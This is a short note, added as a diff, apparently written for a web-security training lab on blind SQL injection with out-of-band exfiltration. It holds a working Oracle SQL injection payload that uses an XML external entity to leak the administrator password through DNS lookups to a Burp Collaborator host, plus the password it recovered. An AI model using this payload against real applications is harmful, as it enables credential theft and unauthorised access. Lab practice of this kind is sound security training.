@@ -1,0 +1,16 @@
+Lab #16 Blind SQL injection with out of band data exfiltration
+
+Vulnerable parameter - tracking cookie
+End Goals:
+1. Exploit SQLi to output the password of the administrator user
+2. Login as the administrator user
+-----------------------------------------------------------------------
+
+hxixzdawpt3og608wrof9lgqshybm2ar.oastify.com
+
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.hxixzdawpt3og608wrof9lgqshybm2ar.oastify.com"> %remote;]>'),'/l') FROM dual)--
+
+=> by this query we'll get all the dns lookups using burp collaborator, and we have injected our query in it to get the administrator password which we'll get in the dns lookup.
+
+password => 455o36yl7f4fri2aq3g1
